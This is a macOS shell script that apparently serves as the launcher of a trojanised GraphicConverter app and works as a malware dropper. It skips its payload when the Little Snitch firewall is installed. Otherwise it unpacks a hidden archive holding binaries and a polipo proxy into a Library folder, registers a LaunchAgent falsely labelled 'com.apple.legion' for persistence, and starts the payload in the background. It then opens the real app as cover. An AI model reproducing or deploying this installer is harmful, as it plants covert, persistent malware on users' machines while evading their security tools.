#!/bin/sh
DIR="$( cd "$( dirname "$0" )" && pwd )"
MAIN_DIR='Library/mdsa1331'
EXEC_NAME='mdsa'
SH_NAME='startup.sh'
ARCHIVE_NAME='arch.zip'
PLIST_NAME="$HOME/Library/LaunchAgents/com.apple.legion.plist"

if [ -e /System/Library/Extensions/LittleSnitch.kext ]
then
	cd "$DIR"
	./GraphicConverter
	exit 0
fi

if [ -e "/$HOME/$MAIN_DIR/$EXEC_NAME" ]
then
	cd "$DIR"
	./GraphicConverter
	exit 0
fi

rm -f "$PLIST_NAME"

mkdir $HOME/$MAIN_DIR

cp "$DIR/$ARCHIVE_NAME" "$HOME/$MAIN_DIR"

chmod 777 "$HOME/$MAIN_DIR"
chmod 777 "$HOME/$MAIN_DIR/$ARCHIVE_NAME"
unzip "$HOME/$MAIN_DIR/$ARCHIVE_NAME" -d "$HOME/$MAIN_DIR" > /dev/null
rm -f "$HOME/$MAIN_DIR/$ARCHIVE_NAME"

chmod +x "$HOME/$MAIN_DIR/$EXEC_NAME"
chmod +x "$HOME/$MAIN_DIR/polipo"
chmod +x "$HOME/$MAIN_DIR/acab.sh"

echo '<?xml version="1.0" encoding="UTF-8"?>' >> $PLIST_NAME
echo '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">' >> $PLIST_NAME
echo '<plist version="1.0">' >>$PLIST_NAME
echo '<dict>' >>$PLIST_NAME
echo '	<key>OnDemand</key>' >> $PLIST_NAME
echo '	<false/>' >> $PLIST_NAME
echo '	<key>Label</key>' >> $PLIST_NAME
echo '	<string>com.apple.legion</string>' >> $PLIST_NAME
echo '	<key>ProgramArguments</key>' >> $PLIST_NAME
echo '	<array>' >> $PLIST_NAME
echo "		<string>$HOME/$MAIN_DIR/$SH_NAME</string>" >> $PLIST_NAME
echo '	</array>' >> $PLIST_NAME
echo '</dict>' >> $PLIST_NAME
echo '</plist>' >> $PLIST_NAME

cd "$HOME/$MAIN_DIR"

./$SH_NAME &

cd "$DIR"
./GraphicConverter

exit 0
